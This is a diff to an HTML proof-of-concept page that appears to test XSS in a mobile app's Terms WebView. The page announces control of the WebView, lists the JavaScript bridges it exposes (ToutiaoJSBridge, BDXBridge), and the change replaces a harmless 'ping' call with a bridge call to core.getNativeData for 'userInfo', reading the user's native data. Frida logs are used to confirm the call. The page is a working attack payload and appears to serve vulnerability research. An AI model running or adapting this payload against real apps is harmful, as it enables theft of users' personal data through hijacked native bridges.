@@ -30,6 +30,11 @@
         font-size: 18px;
         width: 100%;
       }
+      small {
+        display: block;
+        margin-top: 8px;
+        color: #555;
+      }
     </style>
   </head>
   <body>
@@ -38,14 +43,14 @@
       <p>If you see this inside the app, JS is running in the Terms WebView.</p>
 
       <button onclick="testBridge()">TEST NATIVE BRIDGE</button>
-      <p style="font-size:14px;color:#555;">
-        After pressing, check Frida logs for JSB2Impl.invokeMethod().
-      </p>
+      <small>After pressing, check Frida logs for JSB2Impl.invokeMethod(core.getNativeData).</small>
     </div>
 
     <script>
+      // Confirm control of the WebView
       alert("WebView controlled");
 
+      // Show which bridges are exposed
       setTimeout(function () {
         var msg = [];
         if (window.BDXBridge) msg.push("BDXBridge");
@@ -53,21 +58,23 @@
         alert("Available bridges: " + (msg.join(", ") || "none"));
       }, 1000);
 
+      // Reuse the real bridge call you captured: core.getNativeData("userInfo")
       function testBridge() {
         try {
           var payload = {
-            "__callback_id": "1",
+            "func": "core.getNativeData",
+            "params": { "key": "userInfo" },
+            "JSSDK": "2.2.10",
             "__msg_type": "call",
-            "func": "ping",
-            "params": { from: "gauth-xss-poc" }
+            "__callback_id": "9999"
           };
 
           if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
             ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));
-            alert("Sent ToutiaoJSBridge.invokeMethod()");
+            alert("Sent ToutiaoJSBridge.invokeMethod(core.getNativeData,userInfo)");
           } else if (window.BDXBridge && BDXBridge._invokeMethod) {
             BDXBridge._invokeMethod(JSON.stringify(payload));
-            alert("Sent BDXBridge._invokeMethod()");
+            alert("Sent BDXBridge._invokeMethod(core.getNativeData,userInfo)");
           } else {
             alert("No bridge method available");
           }
